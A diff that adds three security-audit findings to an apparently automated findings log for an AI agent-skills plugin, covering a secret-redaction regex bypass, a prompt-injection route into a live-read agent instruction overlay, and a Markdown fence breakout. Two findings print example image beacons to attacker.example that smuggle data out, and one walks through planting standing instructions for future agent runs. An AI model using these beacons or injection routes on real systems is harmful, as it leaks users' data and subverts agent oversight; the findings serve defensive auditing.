@@ -2711,4 +2711,62 @@ Any fork PR that touches `plugins/ievo/**` or `.claude-plugin/**` triggers `pre-
 
 ---
 
+## S-2026-08-11-001 — scrub.mjs's ASSIGNMENT_RE leading `\b` never fires after an underscore, so underscore-prefixed secret-shaped names (`_authToken=`, `_password=`) bypass redaction entirely
+
+```yaml
+id: S-2026-08-11-001
+discovered_at: 2026-08-11T00:00:00Z
+run_id: 31468098986
+target_repo: ievo-ai/skills
+title: scrub.mjs's redactNamedSecrets never matches an underscore-prefixed secret-shaped identifier (_authToken=, _password=, __SECRET_KEY=) because the leading \b in ASSIGNMENT_RE cannot fire between two \w characters, leaking the credential verbatim
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/612
+cwe: CWE-184
+confidence: high
+location: plugins/ievo/scripts/scrub.mjs:230-234 (NAME_ALT) and :400-403 (ASSIGNMENT_RE)
+```
+
+`ASSIGNMENT_RE` is built as `` \b(${NAME_ALT})\b(...) ``, and all three `NAME_ALT` alternatives require their first matched character to come from `[A-Za-z0-9]` — none can start a match at a literal `_`. In JS regex, `_` counts as a `\w` character identical in kind to a letter/digit for `\b` purposes, and `\b` only fires at a `\w`/non-`\w` transition. For input like the real `.npmrc` shape `//registry.npmjs.org/:_authToken=npm_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX` or `_password = "hunter2superSecret"`, the character immediately before the letter that begins the secret-shaped name (`a` in `authToken`, `p` in `password`) is the preceding `_` — itself a `\w` character — so `\b` never fires at that position and `redactNamedSecrets` skips the entire assignment. None of the other four passes in `scrub()`'s pipeline catch this shape either: `redactProviderSecrets`'s `PROVIDER_SECRET_RE` has no npm-token entry (and no entry at all for the countless other unlisted providers), `redactHttpCredentialHeaders` only matches `Authorization`/`Cookie`/`Set-Cookie` headers, and `redactUrlCredentials` only matches `scheme://user:pass@host` userinfo — neither of which this shape is. Verified with a live reproduction against current source:
+```js
+const decoy = "//registry.npmjs.org/:_authToken=npm_" + "X".repeat(36);
+scrub(decoy); // returns the input completely unredacted, byte-for-byte
+```
+The value survives `scrub()`'s full pipeline untouched and is persisted verbatim into `.ievo/evolution-candidates/<session-id>.jsonl` via `evolution_candidates.mjs`'s `--text-file` path, or emitted verbatim to stdout for the documented direct-pipe CLI usage — defeating the redaction guarantee for a naming convention (`_`-prefixed) used by `.npmrc`, Python private attributes, and many CI/config dotfiles. Recommendation: replace the leading `\b` in `ASSIGNMENT_RE` (and the equivalent leading `\b` in `HTTP_CRED_HEADER_RE`, same root cause) with a negative lookbehind that only excludes an immediately-preceding alphanumeric — `` (?<![A-Za-z0-9])(${NAME_ALT})\b `` — so a preceding `_`/`-`/`.`/`:`/`/`/quote/whitespace all count as a real boundary without weakening the existing mid-identifier protections (which are governed by the trailing `\b` and the suffix grammar, not the leading one). Add regression tests for `_authToken=`, `_password=`, `__SECRET_KEY=`, and the real `.npmrc` shape.
+
+## S-2026-08-11-002 — evolution.md Step 4 appends lesson text verbatim into a live-read agent-instruction overlay with none of this file's own excerpt-containment fencing applied
+
+```yaml
+id: S-2026-08-11-002
+discovered_at: 2026-08-11T00:00:00Z
+run_id: 31468098986
+target_repo: ievo-ai/skills
+title: evolution.md's Step 4 overlay append and Step 4.6/4.65's verbatim-lesson-text reporting apply none of this same file's own Step 5 excerpt-containment rule, letting untrusted text laundered through a lesson capture become a standing unfenced instruction in a live-read overlay or an unfenced public issue body
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/613
+cwe: CWE-1427
+confidence: medium
+location: plugins/ievo/agents/evolution.md:507 (Step 4 overlay-append template) and :670-684 (Step 4.6/4.65 upstream-escalation reporting)
+```
+
+`agents/evolution.md` Step 5 carries an extensive, explicitly-documented "Excerpt containment" rule (~line 710-762) for the `SKIPPED` report lines it renders — but Step 4's overlay-append template (`<full lesson text — verbatim>`, line 507) and Step 4.6/4.65's "report... plus the **verbatim lesson text**" instructions (lines ~670/684, used when handing a lesson off to `/ievo:feedback` for public posting) apply no equivalent fencing, despite this being the identical class of untrusted-content-rendering risk the file already guards elsewhere. Exploit chain: `review-retrospective.md` (same agents/ module) correctly treats PR review/comment/thread bodies as untrusted data and surfaces them fenced in its own cluster report; if a human, deciding to capture a finding as a durable `/ievo:evo` lesson, copies text that includes or paraphrases an attacker-crafted excerpt from that report (e.g. embedded `![x](https://attacker.example/beacon.png?d=<data>)`, or plain-language text engineered to read as a legitimate instruction), `evolution.md` Step 4 appends it — verbatim, unfenced, no content review — into `.ievo/evolution/<scope>/<name>.md`. The marker this same agent injects instructs every future dispatch of the target agent/skill to "read [the overlay] if it exists, and apply ALL rules from its sections IN ADDITION to the instructions below" — i.e. the overlay is read live as authoritative behavioral instructions for every subsequent invocation, not merely displayed once. Separately, Step 4.6/4.65 report the same unescaped text back to the caller specifically so it can be handed to `/ievo:feedback`, which files it into a public third-party GitHub issue — the exact `report_template.body` pattern `security-auditor.md` fences meticulously, left unfenced here. Blast radius: confidentiality high / integrity high (a laundered overlay entry becomes a standing instruction silently degrading future audits of the same agent/skill) / availability low. Confidence is medium rather than high because exploitation requires a human to forward untrusted text into the lesson-capture flow — `review-retrospective.md` never auto-escalates, and `evo/SKILL.md` (outside this module) may or may not carry its own warning at that hand-off point. Recommendation: apply this same file's Step 5 excerpt-containment discipline to Step 4's overlay append and to Step 4.6/4.65/4.7's verbatim-lesson-text reporting — at minimum, scan for Markdown link/image syntax and fence any such spans before append or hand-off; more fundamentally, add a rule requiring a human to paraphrase (not copy/paste) lesson text that traces back to untrusted third-party content before Step 4 treats it as durable instruction content, since the overlay is read live as authoritative rules for every future dispatch.
+
+## S-2026-08-11-003 — feedback/SKILL.md's init-log attachment uses a fixed backtick fence with no run-length sizing, unlike this same file's own Step 3.9 fence-containment rule for the adjacent tool-failure-record attachment
+
+```yaml
+id: S-2026-08-11-003
+discovered_at: 2026-08-11T00:00:00Z
+run_id: 31468098986
+target_repo: ievo-ai/skills
+title: feedback/SKILL.md's Step 3.85/Step 4 init-log attachment embeds untrusted log content in a fixed triple-backtick fence with no backtick-run-sizing scan, unlike this same file's Step 3.9 rule for the sibling tool-failure-record attachment
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/614
+cwe: CWE-79
+confidence: medium
+location: plugins/ievo/skills/feedback/SKILL.md:306 (Step 4 — Attached: /ievo:init run log block)
+```
+
+`feedback/SKILL.md` Step 3.9 defines an explicit "Fence containment" rule for the tool-failure-record attachment: before embedding that block, scan the joined lines for the longest run of consecutive backticks and widen the fence to one character longer than that. Step 3.85/Step 4's sibling attachment — "Attached: /ievo:init run log", which embeds the full contents of `.ievo/log/init-*.md` — uses a fixed ` ```markdown ``` ` fence with no equivalent scan, confirmed by direct re-read at line 306. Exploit chain: a malicious skill/plugin published on skills.sh or the Codex marketplace carries a crafted `name`/`description` containing a backtick run (3+) followed by `![x](https://attacker.example/beacon.png?d=<data>)` — this candidate metadata is untrusted, externally-writable pre-install display text per `index-repos/SKILL.md` Step 2's own reasoning, not subject to any charset validation until actual install time. When the user runs `/ievo:init`, this candidate is logged verbatim into `.ievo/log/init-<timestamp>.md`'s "Candidates after dedup + ranking" table with no backtick-escaping. If the user later runs `/ievo:feedback` for an unrelated bug, accepts the Step 3.85 offer to attach that log (labeled "Recommended for bug reports"), and confirms Step 5's Submit gate, the embedded backtick run prematurely closes the fixed outer fence, letting the attacker's injected Markdown render live in the resulting public GitHub issue. Blast radius: confidentiality low / integrity none / availability none (rendering-only exfiltration-beacon/spoofed-link risk, same class as the already-fixed `inspect/SKILL.md`/`agents/evolution.md` Step 5 gaps). Recommendation: apply the same fence-containment procedure Step 3.9 already defines to the Step 3.85/Step 4 init-log attachment — scan for the longest backtick run in the log content and widen the fence to one character longer (minimum 3) before embedding, mirroring Step 3.9's rule for the block immediately below it.
+
+---
+
 
